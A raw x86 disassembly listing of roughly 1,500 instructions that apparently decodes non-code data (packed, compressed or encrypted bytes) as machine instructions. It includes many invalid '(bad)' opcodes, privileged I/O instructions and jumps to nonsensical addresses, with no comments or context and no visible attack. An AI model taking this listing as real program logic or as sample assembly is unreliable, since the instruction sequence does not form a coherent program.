  428108:	inc    BYTE PTR [edi-0x1975cfa0]
  42810e:	add    eax,0x318f94b7
  428113:	ret    0xfe12
  428116:	jge    0x428147
  428118:	push   ebp
  428119:	pop    edi
  42811a:	ret    
  42811b:	leave  
  42811c:	scas   eax,DWORD PTR es:[edi]
  42811d:	sub    cl,0x0
  428120:	add    ah,bl
  428122:	repnz dec esi
  428124:	pop    edi
  428125:	bound  ebp,QWORD PTR [esi]
  428127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428128:	fwait
  428129:	into   
  42812a:	rcl    DWORD PTR [ecx+0x30db23a4],1
  428130:	js     0x42816c
  428132:	int    0x3d
  428134:	mov    eax,0x331f1f49
  428139:	xor    al,0xd9
  42813b:	ds push 0xffffffe3
  42813e:	pop    edx
  42813f:	mov    dl,0xcc
  428141:	das    
  428142:	add    BYTE PTR [eax],al
  428144:	ret    0x1b6c
  428147:	jo     0x42812a
  428149:	jmp    0x4280de
  42814b:	mul    BYTE PTR [ebx+0x18af10e2]
  428151:	sub    bl,dl
  428153:	mov    dl,BYTE PTR [esi+0x23800e]
  428159:	add    ah,dh
  42815b:	push   ebx
  42815c:	das    
  42815d:	sti    
  42815e:	and    al,0x7a
  428160:	xchg   ebx,eax
  428161:	and    dh,dh
  428163:	add    al,0xd1
  428165:	add    BYTE PTR [eax],al
  428167:	xor    DWORD PTR ds:[ecx+0x5b],0xc44cd15d
  42816f:	add    BYTE PTR [eax],al
  428171:	push   eax
  428172:	and    bl,BYTE PTR [ecx-0x6]
  428175:	into   
  428176:	ins    BYTE PTR es:[edi],dx
  428177:	shl    DWORD PTR [edi],1
  428179:	test   al,0xe1
  42817b:	cmc    
  42817c:	int3   
  42817d:	call   0x5f858182
  428182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428183:	repnz stos BYTE PTR es:[edi],al
  428185:	adc    edx,ebx
  428187:	arpl   di,cx
  428189:	ins    BYTE PTR es:[edi],dx
  42818a:	cmp    esi,DWORD PTR [ebx-0xb]
  42818d:	and    al,bh
  42818f:	push   esp
  428190:	dec    ebp
  428191:	ja     0x4281dc
  428193:	ret    
  428194:	aas    
  428195:	jmp    0xa708:0xb4311b2d
  42819c:	add    BYTE PTR [eax],al
  42819e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42819f:	fidiv  WORD PTR [esi]
  4281a1:	stos   BYTE PTR es:[edi],al
  4281a2:	push   0x4efe242f
  4281a7:	into   
  4281a8:	mov    fs,ebp
  4281aa:	xchg   esi,eax
  4281ab:	xor    dl,BYTE PTR [edx-0x74]
  4281ae:	jl     0x4281b0
  4281b0:	add    bh,dl
  4281b2:	cli    
  4281b3:	xchg   esi,eax
  4281b4:	retf   
  4281b5:	adc    ecx,DWORD PTR [eax-0x2d]
  4281b8:	add    BYTE PTR [eax],al
  4281ba:	loope  0x4281e1
  4281bc:	call   0xf0:0x8860359a
  4281c3:	add    BYTE PTR [ebp+edi*1-0x30],dh
  4281c7:	popa   
  4281c8:	imul   esp,esp,0xffffffba
  4281cb:	not    esp
  4281cd:	in     eax,dx
  4281ce:	xor    DWORD PTR [ebp+0x7a],0x155c539b
  4281d5:	je     0x4281c6
  4281d7:	fadd   QWORD PTR [ebx]
  4281d9:	out    dx,al
  4281da:	sub    ch,ch
  4281dc:	mov    ebp,0xf29e0bba
  4281e1:	nop
  4281e2:	xor    al,0x3f
  4281e4:	add    al,BYTE PTR [ebx+0x14]
  4281e7:	jmp    FWORD PTR ds:0xe1805aed
  4281ed:	add    BYTE PTR [eax],al
  4281ef:	mov    ch,0xa7
  4281f1:	rcl    DWORD PTR [ecx+eiz*2],cl
  4281f4:	sub    ecx,DWORD PTR [ecx-0x70]
  4281f7:	push   edx
  4281f8:	sub    ebp,DWORD PTR ds:0x578c
  4281fe:	mov    al,ds:0xbe0aebbd
  428203:	stos   DWORD PTR es:[edi],eax
  428204:	mov    edi,0xb893333d
  428209:	xchg   ebp,eax
  42820a:	dec    esi
  42820b:	fprem1 
  42820d:	ret    0x55c7
  428210:	out    dx,eax
  428211:	xchg   esp,eax
  428212:	adc    esp,DWORD PTR [edi+0x76]
  428215:	cmc    
  428216:	jns    0x4281f2
  428218:	add    BYTE PTR [ebp+0x0],ah
  42821b:	add    BYTE PTR [esi],bh
  42821d:	inc    eax
  42821e:	cld    
  42821f:	add    BYTE PTR [eax],al
  428221:	cmp    ebx,DWORD PTR [edx+0x4719139]
  428227:	rol    BYTE PTR [eax],1
  428229:	add    dl,cl
  42822b:	scas   eax,DWORD PTR es:[edi]
  42822c:	sbb    ch,0x0
  42822f:	add    ah,bh
  428231:	dec    ecx
  428232:	dec    ebp
  428233:	(bad)  
  428235:	cwde   
  428236:	mov    eax,ds:0xdf1195e7
  42823b:	and    ch,BYTE PTR [edx+0x64]
  42823e:	push   ebx
  42823f:	mov    eax,ds:0x2e057323
  428244:	hlt    
  428245:	inc    esi
  428246:	loopne 0x42823a
  428248:	dec    ecx
  428249:	dec    edx
  42824a:	fwait
  42824b:	lahf   
  42824c:	std    
  42824d:	in     eax,dx
  42824e:	pop    eax
  42824f:	push   es
  428250:	mov    ah,0xbf
  428252:	rol    BYTE PTR [edi+0x0],0x0
  428256:	cmc    
  428257:	push   ebx
  428258:	sub    BYTE PTR [ebp+0x54eec5aa],dl
  42825e:	sub    bh,BYTE PTR [ecx]
  428260:	pop    edi
  428261:	mov    ds:0x76a4f6e8,al
  428266:	ror    BYTE PTR [ecx],1
  428268:	rol    BYTE PTR [eax+eax*1],0x0
  42826c:	ds push ecx
  42826e:	pop    DWORD PTR [eax+0x6900005a]
  428274:	mov    BYTE PTR [eax-0x4ffffff9],0xaf
  42827b:	out    0xdc,al
  42827d:	inc    esp
  42827e:	test   al,0x0
  428280:	add    BYTE PTR [ecx+ebx*1-0x5f],bh
  428284:	outs   dx,BYTE PTR ds:[esi]
  428285:	loopne 0x4282f5
  428287:	jp     0x428304
  428289:	mov    esp,0x3c7650f3
  42828e:	retf   0xd6d9
  428291:	shl    DWORD PTR [edx+eax*4],0x81
  428295:	push   0xd41a3aa2
  42829a:	add    al,0x10
  42829c:	add    BYTE PTR [eax],al
  42829e:	xchg   edx,eax
  42829f:	(bad)  
  4282a0:	retf   
  4282a1:	add    BYTE PTR [eax],al
  4282a3:	adc    eax,0x4a785274
  4282a8:	lahf   
  4282a9:	loop   0x428286
  4282ab:	dec    ebx
  4282ac:	xlat   BYTE PTR ds:[ebx]
  4282ad:	cmp    ebx,DWORD PTR [edi+0x7b94303e]
  4282b3:	je     0x42823a
  4282b5:	pusha  
  4282b6:	ret    
  4282b7:	and    al,0xfd
  4282b9:	add    ah,dh
  4282bb:	mov    ecx,0x5533f11b
  4282c0:	enter  0x3d,0x0
  4282c4:	fsubrp st(3),st
  4282c6:	xchg   cl,bl
  4282c8:	mov    eax,ds:0xfd7726d1
  4282cd:	cmp    DWORD PTR [ebx],0x24
  4282d0:	pop    edx
  4282d1:	fidivr DWORD PTR [edx+0x2759725e]
  4282d7:	outs   dx,BYTE PTR ds:[esi]
  4282d8:	or     BYTE PTR [esi],ch
  4282da:	add    BYTE PTR [eax],al
  4282dc:	shr    BYTE PTR [ebx+0x6],1
  4282df:	in     eax,0x74
  4282e1:	mov    esi,0x4140
  4282e6:	addr16 inc esi
  4282e8:	bound  esi,QWORD PTR [ebx+esi*4-0xd]
  4282ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282ed:	iret   
  4282ee:	neg    BYTE PTR [edi]
  4282f0:	test   eax,0x7796d7c9
  4282f5:	ret    0x4239
  4282f8:	jnp    0x4282e6
  4282fa:	ja     0x4282b7
  4282fc:	mov    ds:0x75fb7378,al
  428301:	(bad)  
  428302:	dec    esp
  428303:	mov    es,WORD PTR [eax]
  428305:	add    BYTE PTR [ecx],dh
  428307:	jmp    0x4282e8
  428309:	imul   ebp,DWORD PTR [ebx-0x301edce7],0x7fbc015b
  428313:	and    cl,ch
  428315:	mov    ?,WORD PTR [edx]
  428317:	dec    ecx
  428318:	jb     0x42838a
  42831a:	sub    al,BYTE PTR ds:[edx+0x7b622a0b]
  428321:	out    0x42,eax
  428323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428324:	idiv   DWORD PTR [eax-0x36]
  428327:	in     al,0x8
  428329:	add    BYTE PTR [eax],0x0
  42832c:	cmp    bl,ch
  42832e:	pop    edi
  42832f:	jns    0x428382
  428331:	push   edi
  428332:	xchg   esi,eax
  428333:	cwde   
  428334:	mov    ?,WORD PTR [edx+ecx*2+0x6d8a578]
  42833b:	sub    eax,0x86b041ae
  428340:	mov    dl,0x88
  428342:	pop    eax
  428343:	add    BYTE PTR [eax],al
  428345:	fs into 
  428347:	add    ebx,DWORD PTR [edi+0x7d]
  42834a:	push   ds
  42834b:	add    eax,0xdfaf50a9
  428350:	test   edx,ebp
  428352:	add    ecx,edi
  428354:	mov    dl,0x3b
  428356:	shr    eax,1
  428358:	push   ss
  428359:	dec    ebx
  42835a:	push   0x4
  42835c:	and    al,BYTE PTR [eax]
  42835e:	add    BYTE PTR [eax-0x71],dl
  428361:	mul    BYTE PTR [edx-0x778c59f3]
  428367:	sub    al,BYTE PTR [eax]
  428369:	add    BYTE PTR ds:0xdd607cd3,bh
  42836f:	fxch   st(2)
  428371:	repnz addr16 mov al,ds:0xc16b
  428376:	sar    BYTE PTR ds:0xccd12020,cl
  42837c:	aad    0x0
  42837e:	add    BYTE PTR [eax-0x3a],bl
  428381:	mov    edi,0xc39c18df
  428386:	(bad)  
  428387:	jmp    0x42830e
  428389:	test   al,0xf2
  42838b:	mov    WORD PTR [esi],ss
  42838d:	add    BYTE PTR [eax],al
  42838f:	cs mov edi,0xe6fb1e9e
  428395:	cmp    ebp,ecx
  428397:	cmp    BYTE PTR [ebx-0x1e],ah
  42839a:	pop    ebp
  42839b:	mov    DWORD PTR [ebx],edi
  42839d:	aaa    
  42839e:	je     0x42841f
  4283a0:	pop    edx
  4283a1:	inc    ebx
  4283a2:	nop
  4283a3:	add    BYTE PTR [eax],dh
  4283a5:	add    BYTE PTR [eax],al
  4283a7:	ds scas al,BYTE PTR es:[edi]
  4283a9:	fst    QWORD PTR [ebx-0x4c]
  4283ac:	fdivp  st(0),st
  4283ae:	not    DWORD PTR [eax+ebx*2+0x7f8057e3]
  4283b5:	add    BYTE PTR [eax],al
  4283b7:	icebp  
  4283b8:	in     al,dx
  4283b9:	push   edi
  4283ba:	aas    
  4283bb:	loope  0x42842e
  4283bd:	jne    0x4283b9
  4283bf:	mov    eax,0x314fe498
  4283c4:	cmp    esi,ebp
  4283c6:	repnz inc ecx
  4283c8:	leave  
  4283c9:	addr16 ds dec eax
  4283cc:	hlt    
  4283cd:	add    BYTE PTR [eax],al
  4283cf:	mov    al,ds:0xd41d5935
  4283d4:	pop    edx
  4283d5:	mov    al,0xc7
  4283d7:	add    ebx,eax
  4283d9:	outs   dx,BYTE PTR ds:[esi]
  4283da:	pop    edx
  4283dc:	cmp    ah,BYTE PTR [edx*1+0x6303ad6]
  4283e3:	aaa    
  4283e4:	test   DWORD PTR [esi+eiz*4],0xdb6b0000
  4283eb:	(bad)  
  4283ec:	xor    al,0x8
  4283ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283ef:	add    BYTE PTR [eax],al
  4283f1:	jecxz  0x428437
  4283f3:	inc    ecx
  4283f4:	add    BYTE PTR [eax],al
  4283f6:	and    BYTE PTR [ecx-0x2a6e86d],bl
  4283fc:	stos   DWORD PTR es:[edi],eax
  4283fd:	and    BYTE PTR [edx+0x53],dh
  428400:	iret   
  428401:	jne    0x4283cf
  428403:	xor    DWORD PTR [eax],eax
  428405:	add    BYTE PTR [esi-0x6b9deab6],dl
  42840b:	mov    ebx,0x7b371203
  428410:	into   
  428411:	(bad)  
  428413:	mov    al,ds:0x7196575e
  428418:	int3   
  428419:	mov    cl,0x0
  42841b:	add    BYTE PTR [edi],dl
  42841d:	stc    
  42841e:	arpl   WORD PTR [eax+0x72],di
  428421:	add    ecx,ebp
  428423:	mov    al,ds:0x535acab8
  428428:	vmptrld QWORD PTR [edi+0x71]
  42842c:	cmp    cl,BYTE PTR [ebp+ecx*4+0x0]
  428430:	add    BYTE PTR [eax-0x1899d158],bh
  428436:	enter  0xb4,0x0
  42843a:	dec    ecx
  42843b:	cmp    BYTE PTR [ebx-0x74d0588b],dl
  428441:	mov    esp,0x53c18687
  428446:	mov    eax,ds:0x1678705a
  42844b:	stc    
  42844c:	in     al,0x93
  42844e:	adc    ch,BYTE PTR [eax-0x74]
  428451:	stos   BYTE PTR es:[edi],al
  428452:	add    BYTE PTR [eax],al
  428454:	add    esi,esp
  428456:	cmp    esi,DWORD PTR [eax+0x3550a5a4]
  42845c:	lock mov edi,0xa580660e
  428462:	add    BYTE PTR [eax],al
  428464:	push   DWORD PTR [ebp+0x27]
  428467:	xor    dh,BYTE PTR [edx+eax*4]
  42846a:	push   edi
  42846b:	dec    esi
  42846c:	mov    bl,0xf6
  42846e:	jne    0x4284aa
  428470:	mov    esp,0x4195eb4d
  428475:	push   edx
  428476:	daa    
  428477:	dec    eax
  428478:	add    al,0x0
  42847a:	add    BYTE PTR [eax+0x654b45a6],ah
  428480:	push   edx
  428481:	or     BYTE PTR [eax-0x70ad0000],ch
  428487:	outs   dx,BYTE PTR ds:[esi]
  428488:	mov    bh,0x48
  42848a:	mov    cl,0x0
  42848c:	add    BYTE PTR [eax],dl
  42848e:	mov    eax,0xc1149f82
  428493:	inc    edx
  428494:	mov    bh,0x72
  428496:	addr16 xor bh,dh
  428499:	pop    eax
  42849a:	test   DWORD PTR [ebx+0x4],ecx
  42849d:	push   esp
  42849e:	add    BYTE PTR [eax],al
  4284a0:	fs inc ebx
  4284a2:	(bad)  
  4284a3:	hlt    
  4284a4:	mov    ecx,0xad782205
  4284a9:	xlat   BYTE PTR ds:[ebx]
  4284aa:	inc    ebx
  4284ab:	(bad)  
  4284ac:	jns    0x428464
  4284ae:	mov    esp,0x18d4f983
  4284b3:	popa   
  4284b4:	cs test ebp,esi
  4284b7:	xchg   ecx,eax
  4284b8:	scas   eax,DWORD PTR es:[edi]
  4284b9:	ror    ah,0x0
  4284bc:	add    BYTE PTR [ebp+ebp*1-0x26f9dd8f],bl
  4284c3:	inc    edi
  4284c4:	dec    edi
  4284c5:	mov    esp,0xb74c1c
  4284ca:	add    BYTE PTR [edi+0x73ceb5e5],ch
  4284d0:	call   0x7b:0x8c925f9a
  4284d7:	add    al,ah
  4284d9:	ins    BYTE PTR es:[edi],dx
  4284da:	or     eax,0xcd08
  4284df:	mov    WORD PTR [esi],ss
  4284e1:	add    BYTE PTR [eax],al
  4284e3:	sub    bl,dl
  4284e5:	dec    ecx
  4284e6:	pop    edi
  4284e7:	jge    0x428557
  4284e9:	ficom  WORD PTR [edx]
  4284eb:	pop    esp
  4284ec:	ja     0x428535
  4284ee:	test   ebx,edi
  4284f0:	mov    cl,0xfc
  4284f2:	xor    eax,DWORD PTR [ebp-0x67]
  4284f5:	cwde   
  4284f6:	retf   
  4284f7:	mov    ebx,0x79b75682
  4284fc:	inc    eax
  4284fd:	mov    esi,0x18980000
  428502:	inc    ebp
  428503:	xchg   ebp,eax
  428504:	push   es
  428505:	mov    ecx,DWORD PTR [edx]
  428507:	sbb    DWORD PTR [esi],ebp
  428509:	clc    
  42850a:	fstp   QWORD PTR [ebp-0x1615d14d]
  428510:	sub    eax,0xa6a8e8d1
  428515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428516:	mov    al,ds:0x9806bccb
  42851b:	(bad)  
  42851c:	fiadd  WORD PTR [ebx+0xa00]
  428522:	test   edi,esp
  428524:	push   ds
  428525:	xchg   ebp,eax
  428526:	adc    edi,ebx
  428528:	lods   al,BYTE PTR ds:[esi]
  428529:	or     al,dl
  42852b:	retf   0x9e07
  42852e:	ja     0x4285a5
  428530:	pop    edx
  428531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428532:	mov    ch,0x94
  428534:	ss xchg ebp,eax
  428536:	shr    al,cl
  428538:	int3   
  428539:	jp     0x42853b
  42853b:	add    BYTE PTR [edx-0x68c6f98b],ah
  428541:	call   0x0:0x9000a87d
  428548:	and    cl,bh
  42854a:	jnp    0x4285a5
  42854c:	fstp   QWORD PTR [eax]
  42854e:	jg     0x4284de
  428550:	push   esp
  428551:	and    BYTE PTR [ebx-0x13],dl
  428554:	int3   
  428555:	cwde   
  428556:	add    BYTE PTR [eax],al
  428558:	add    eax,DWORD PTR [edx]
  42855a:	lods   al,BYTE PTR ds:[esi]
  42855b:	push   0xffffff94
  42855d:	enter  0x57,0x0
  428561:	pop    esi
  428562:	or     BYTE PTR [edi-0x23],0x6c
  428566:	inc    edi
  428567:	addr16 call 0x392b:0x4d0e1e31
  42856f:	or     eax,0x4da2f4b2
  428574:	fldln2 
  428576:	inc    ebx
  428577:	push   ebx
  428578:	test   BYTE PTR [ebx+0x0],bh
  42857b:	add    cl,dl
  42857d:	pop    es
  42857e:	ins    DWORD PTR es:[edi],dx
  42857f:	ins    DWORD PTR es:[edi],dx
  428580:	mov    WORD PTR [eax+eax*1+0x29ec9000],gs
  428587:	sub    eax,0xc8b7b2f1
  42858c:	and    DWORD PTR [eax],eax
  42858e:	add    al,bh
  428590:	out    0xb6,al
  428592:	inc    esp
  428593:	les    eax,FWORD PTR [eax]
  428595:	add    al,bl
  428597:	fs pop edx
  428599:	fidivr WORD PTR [esi-0x1e98c3c2]
  42859f:	sbb    DWORD PTR [edi+0x53],edx
  4285a2:	pop    ss
  4285a3:	cli    
  4285a4:	sub    DWORD PTR [ecx-0x695dcd65],ebp
  4285aa:	sub    ebp,eax
  4285ac:	shl    eax,0x54
  4285af:	jno    0x42860f
  4285b1:	stos   DWORD PTR es:[edi],eax
  4285b2:	mov    eax,ds:0xc5177029
  4285b7:	adc    BYTE PTR [edx],dh
  4285b9:	sub    ch,BYTE PTR [ecx]
  4285bb:	div    DWORD PTR [ebx-0x2f]
  4285be:	fisttp DWORD PTR [eax+0x41]
  4285c1:	add    BYTE PTR [eax],al
  4285c3:	lods   al,BYTE PTR ds:[esi]
  4285c4:	sti    
  4285c5:	retf   0xa5f2
  4285c8:	ret    
  4285c9:	cld    
  4285ca:	fcomip st,st(0)
  4285cc:	outs   dx,BYTE PTR ds:[esi]
  4285cd:	and    DWORD PTR [eax-0x7ef49ab1],edx
  4285d3:	jnp    0x42860b
  4285d5:	mov    WORD PTR [ebx],?
  4285d7:	add    BYTE PTR [eax],al
  4285d9:	and    DWORD PTR ds:0x6c023260,0xffffff84
  4285e0:	push   0x0
  4285e2:	add    BYTE PTR [ebx-0x4ce6e093],cl
  4285e8:	and    ah,al
  4285ea:	rol    BYTE PTR [eax],0x0
  4285ed:	aas    
  4285ee:	(bad)  
  4285ef:	imul   ebp,ebp,0x79
  4285f2:	call   DWORD PTR [edi+0x2378d8e1]
  4285f8:	sub    al,0xdb
  4285fa:	mov    ah,0x5f
  4285fc:	mov    bl,0xf4
  4285fe:	imul   edx,DWORD PTR [ecx-0xa00d844],0xa7b7a72c
  428608:	sar    BYTE PTR [ebx+eiz*4],cl
  42860b:	sub    ebp,DWORD PTR [edi-0xeaf3da2]
  428611:	xor    dh,BYTE PTR [edx]
  428613:	push   eax
  428614:	inc    esp
  428615:	ins    DWORD PTR es:[edi],dx
  428616:	add    BYTE PTR [eax],al
  428618:	(bad)  
  428619:	dec    ebp
  42861a:	(bad)  
  42861b:	mov    esi,ebp
  42861d:	ja     0x4285ae
  42861f:	mov    al,0xf6
  428621:	(bad)  
  428622:	push   edx
  428623:	fwait
  428624:	sti    
  428625:	int    0x28
  428627:	in     al,dx
  428628:	call   0x66a25b40
  42862d:	jb     0x42860c
  42862f:	cwde   
  428630:	mov    WORD PTR [edx],cs
  428632:	add    BYTE PTR [eax],al
  428634:	dec    ecx
  428635:	cmc    
  428636:	es into 
  428638:	pop    edx
  42863a:	fisttp DWORD PTR [ecx-0x8068efb]
  428640:	rcr    DWORD PTR [ecx-0x7a],1
  428643:	ds push edx
  428645:	fimul  DWORD PTR [esi+0x23]
  428648:	sti    
  428649:	out    0x6,al
  42864b:	mov    bh,0x16
  42864d:	es (bad) 
  42864f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428651:	pop    edi
  428652:	jns    0x42868c
  428654:	fcomp  st(4)
  428656:	imul   edi,DWORD PTR [ebp*4-0x6b1b7856],0xd
  42865e:	xor    al,0x86
  428660:	dec    edi
  428661:	push   edi
  428662:	pop    edx
  428663:	jmp    0x42860b
  428665:	pusha  
  428666:	scas   al,BYTE PTR es:[edi]
  428667:	push   eax
  428668:	rol    ah,cl
  42866a:	cmp    DWORD PTR [eax],eax
  42866c:	add    BYTE PTR [eax],cl
  42866e:	mov    ebx,0xb9240000
  428673:	and    bl,al
  428675:	loope  0x42862d
  428677:	and    eax,0x40faede
  42867c:	jmp    0x96448681
  428681:	loop   0x428623
  428683:	enter  0x43,0x0
  428687:	pop    ebx
  428688:	mov    al,0x15
  42868a:	mov    bh,0x34
  42868c:	xor    DWORD PTR [ecx+0x21e11a2c],ecx
  428692:	and    al,0xf7
  428694:	jnp    0x42869a
  428696:	les    eax,FWORD PTR [eax]
  428698:	add    BYTE PTR ds:0xabbda0c5,dl
  42869e:	(bad)
  4286a2:	add    eax,0x3e1a21b
  4286a7:	daa    
  4286a8:	imul   edi,DWORD PTR [edi+0x2],0x32
  4286ac:	outs   dx,DWORD PTR ds:[esi]
  4286ad:	ret    0x1202
  4286b0:	aam    0x61
  4286b2:	jl     0x428696
  4286b4:	xchg   ebx,eax
  4286b5:	(bad)  
  4286b6:	adc    al,0xf6
  4286b8:	jo     0x428723
  4286ba:	cli    
  4286bb:	pop    ebx
  4286bc:	add    DWORD PTR [ecx-0x41],edx
  4286bf:	or     DWORD PTR [ebp+0x4a],0x4c4ccbd8
  4286c6:	add    BYTE PTR [eax],al
  4286c8:	xor    al,0x3e
  4286ca:	aam    0xdc
  4286cc:	and    dl,BYTE PTR [edx-0x6bfc0739]
  4286d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286d3:	scas   al,BYTE PTR es:[edi]
  4286d4:	sbb    ah,BYTE PTR [ebx+0x4848]
  4286da:	push   ebx
  4286db:	mov    DWORD PTR [edx+edi*1+0x2db01f6e],esp
  4286e2:	sub    eax,0x86c3233b
  4286e7:	cli    
  4286e8:	retf   
  4286e9:	or     DWORD PTR [edx-0x60],0x62743593
  4286f0:	popf   
  4286f1:	cmc    
  4286f2:	out    0xd7,eax
  4286f4:	cmp    ch,BYTE PTR [edx+0x6407dedb]
  4286fa:	mov    esi,0x99912032
  4286ff:	jb     0x428706
  428701:	mov    al,0x63
  428703:	popa   
  428704:	dec    esp
  428705:	data16 add BYTE PTR [eax],al
  428708:	sbb    al,0xa
  42870a:	pop    ss
  42870b:	jne    0x428709
  42870d:	test   eax,0x805def4f
  428712:	lods   eax,DWORD PTR ds:[esi]
  428713:	add    BYTE PTR [eax],al
  428715:	aam    0x6c
  428717:	cmp    esi,DWORD PTR [edx+ebp*4]
  42871a:	adc    ecx,ecx
  42871c:	cmc    
  42871d:	fucomi st,st(6)
  42871f:	add    DWORD PTR [esi-0x51f2ae0d],ebp
  428725:	into   
  428726:	mov    dh,0x3f
  428728:	nop    DWORD PTR [edi]
  42872b:	xchg   ecx,eax
  42872c:	int3   
  42872d:	mov    al,ds:0x6c030000
  428732:	pop    ebp
  428733:	cmp    ah,bh
  428735:	sbb    DWORD PTR [edx+0x57],ecx
  428738:	ja     0x4286d8
  42873a:	clc    
  42873b:	ins    DWORD PTR es:[edi],dx
  42873c:	ins    DWORD PTR es:[edi],dx
  42873d:	lahf   
  42873e:	into   
  42873f:	adc    dl,BYTE PTR [esp+ecx*2+0x5b]
  428743:	add    BYTE PTR [eax],al
  428745:	fcom   DWORD PTR [edi+0x72]
  428748:	out    0xcc,al
  42874a:	add    BYTE PTR [eax],al
  42874c:	add    ch,dh
  42874e:	fsubr  QWORD PTR [esi-0x9]
  428751:	pop    es
  428752:	sbb    BYTE PTR [esi],bl
  428754:	cmp    DWORD PTR [edx],eax
  428756:	dec    ebx
  428757:	scas   al,BYTE PTR es:[edi]
  428758:	add    bl,bl
  42875a:	mov    edi,0xf9730f5f
  42875f:	push   ss
  428760:	inc    eax
  428761:	aas    
  428762:	add    BYTE PTR [eax],al
  428764:	adc    eax,DWORD PTR [edi]
  428766:	bound  edi,QWORD PTR [esi+eiz*1-0x468eede7]
  42876d:	add    al,BYTE PTR [ecx+0x1c4de2a5]
  428773:	cmp    esi,esp
  428775:	xchg   edx,eax
  428776:	jl     0x4287f6
  428778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428779:	sub    DWORD PTR [ebp-0x70],esp
  42877c:	jae    0x428738
  42877e:	xor    DWORD PTR [ebx+0x3b],ebx
  428781:	xchg   esi,eax
  428782:	xchg   edx,eax
  428783:	push   eax
  428784:	mov    edx,0x6ec585a
  428789:	fst    DWORD PTR [edi]
  42878b:	dec    eax
  42878c:	and    eax,0xdc6a0000
  428791:	mov    eax,ds:0x42a51ce7
  428796:	mov    esp,0x361eb475
  42879b:	sbb    BYTE PTR [ebp-0xd],bl
  42879e:	pop    esi
  42879f:	mov    eax,0x7612319b
  4287a4:	lea    esi,[eax-0x3c]
  4287a7:	adc    eax,DWORD PTR [eax]
  4287a9:	add    ah,al
  4287ab:	ins    DWORD PTR es:[edi],dx
  4287ac:	add    BYTE PTR [eax],al
  4287ae:	sub    dh,BYTE PTR [edi+0xeac054]
  4287b4:	add    BYTE PTR [esi],dh
  4287b6:	mov    dl,ah
  4287b8:	cmp    eax,0x91305edb
  4287bd:	jle    0x428800
  4287bf:	mov    edi,0x1b135f7b
  4287c4:	lods   al,BYTE PTR ds:[esi]
  4287c5:	enter  0x77,0x0
  4287c9:	ret    
  4287ca:	test   BYTE PTR [esi-0x1abf0000],bl
  4287d0:	cs retf 
  4287d2:	mov    eax,ds:0x189ad13f
  4287d7:	(bad)
  4287db:	icebp  
  4287dc:	icebp  
  4287dd:	mov    ch,0x85
  4287df:	fstp   DWORD PTR [ebp+0x7b]
  4287e2:	fs jl  0x428844
  4287e5:	es push esp
  4287e7:	or     al,0xfc
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	cmp    edx,DWORD PTR fs:[edx]
  4287ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287ef:	adc    esi,eax
  4287f1:	ret    
  4287f2:	sar    BYTE PTR [edx+0x63],cl
  4287f5:	out    dx,eax
  4287f6:	mov    ch,0x7e
  4287f8:	or     esi,edi
  4287fa:	inc    di
  4287fc:	adc    al,0x52
  4287fe:	(bad)  
  4287ff:	and    ebp,DWORD PTR [edi+0x1f]
  428802:	push   edx
  428803:	or     DWORD PTR [ebx-0x26],esp
  428806:	cs pusha 
  428808:	leave  
  428809:	outs   dx,BYTE PTR ds:[esi]
  42880a:	fst    st(6)
  42880c:	imul   esi,DWORD PTR [ecx-0x6df6dadf],0x1e
  428813:	fsub   st,st(4)
  428815:	lods   eax,DWORD PTR ds:[esi]
  428816:	retf   0x75eb
  428819:	push   ds
  42881a:	(bad)  
  42881b:	mov    al,dl
  42881d:	popa   
  42881e:	adc    esi,DWORD PTR [edi-0x28]
  428821:	xlat   BYTE PTR ds:[ebx]
  428822:	add    ch,0x61
  428825:	(bad)  cs:[ebp-0x46]
  428829:	sbb    ah,dh
  42882b:	(bad)  [esi]
  42882d:	cmp    DWORD PTR [edi+0x8a40],ebx
  428833:	mov    ch,0x39
  428835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428836:	test   eax,0xbcc4
  42883b:	inc    ecx
  42883c:	stos   DWORD PTR es:[edi],eax
  42883d:	pop    ss
  42883e:	xor    dh,BYTE PTR [edi]
  428840:	mov    ds:0x7959577b,eax
  428845:	inc    ecx
  428846:	xchg   esp,eax
  428847:	jl     0x4287cf
  428849:	and    ecx,DWORD PTR [esi]
  42884b:	push   0x2b
  42884d:	je     0x42886b
  42884f:	push   edi
  428850:	fcmovnu st,st(7)
  428852:	rep lods eax,DWORD PTR ds:[esi]
  428854:	(bad)  
  428856:	xor    DWORD PTR [esi],eax
  428858:	icebp  
  428859:	fild   DWORD PTR [ebp+0x3057f82d]
  42885f:	xchg   ecx,eax
  428860:	add    al,0xbd
  428862:	add    BYTE PTR [eax],al
  428864:	mov    ds,ecx
  428866:	mov    ds:0x1c2b646f,eax
  42886b:	push   0xffffff89
  42886d:	cmc    
  42886e:	hlt    
  42886f:	loop   0x42889d
  428871:	push   edx
  428872:	push   esp
  428873:	or     BYTE PTR [ecx+0x7b6b0000],ah
  428879:	xchg   BYTE PTR [eax-0x3c2c046f],ah
  42887f:	inc    ebp
  428880:	clc    
  428881:	jo     0x428873
  428883:	call   0x5a88ff
  428888:	add    BYTE PTR [eax],ch
  42888a:	jg     0x42888e
  42888c:	add    ecx,DWORD PTR ds:0xe9f5c399
  428892:	cdq    
  428893:	and    ebx,edx
  428895:	push   edi
  428896:	dec    edx
  428897:	shl    DWORD PTR [ebx+0x41c1b8a0],0x51
  42889e:	and    BYTE PTR [ecx+0x0],0x0
  4288a2:	pop    es
  4288a3:	xchg   ecx,ecx
  4288a5:	out    dx,al
  4288a6:	fmul   st,st(6)
  4288a8:	xlat   BYTE PTR ds:[ebx]
  4288a9:	xor    eax,0x467cf49d
  4288ae:	xchg   ebx,eax
  4288af:	mov    ecx,0x9670021d
  4288b4:	mov    DWORD PTR [ecx+ecx*1-0x7b],edx
  4288b8:	rcl    DWORD PTR ds:0x10c86d19,cl
